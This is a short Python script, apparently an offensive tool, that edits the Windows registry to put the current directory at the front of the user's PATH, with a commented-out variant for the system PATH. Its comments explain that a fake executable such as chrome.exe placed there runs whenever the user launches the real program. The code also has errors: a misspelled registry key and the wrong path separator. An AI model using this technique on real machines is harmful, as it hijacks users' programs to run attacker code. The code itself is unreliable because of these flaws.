# the first executable name matched in PATH will be run when its called
# ie making a chrome.exe executable and placing it on the windows path higher than the regular chrome path 
# will cause it to launch our chrome.exe when the user calls it instead of the once expected

import os, winreg

def readPathValue(reghive,regpath):
    reg = winreg.ConnectRegistry(None, reghive)
    key = winreg.OpenKey(reg,regpath, access=winreg.KEY_READ)
    index = 0
    while True:
        val = winreg.EnumValue(key, index)
        if val[0] == "Path":
            return val[1]
        index+=1

def editPathValue(reghive, regpath, targetdir):
    path = readPathValue(reghive, regpath)
    newpath = targetdir + ":" + path
    reg = winreg.ConnectRegistry(None, reghive)
    key = winreg.OpenKey(reg, regpath, access = winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key,"Path",0,winreg.REG_EXPAND_SZ, newpath)


# Modify user path
reghive = winreg.HKEY_CURRENT_USER
regpath = "Enviornment"
targetdir = os.getcwd()

editPathValue(reghive, regpath, targetdir)

# Modify SYSTEM path
# reghive = winreg.HKEY_LOCAL_MACHINE
# regpath = "SYSTEM\CurrentControlSet\Control\Session Manager\Enviornment"
# editPathValue(reghive, regpath, targetdir)
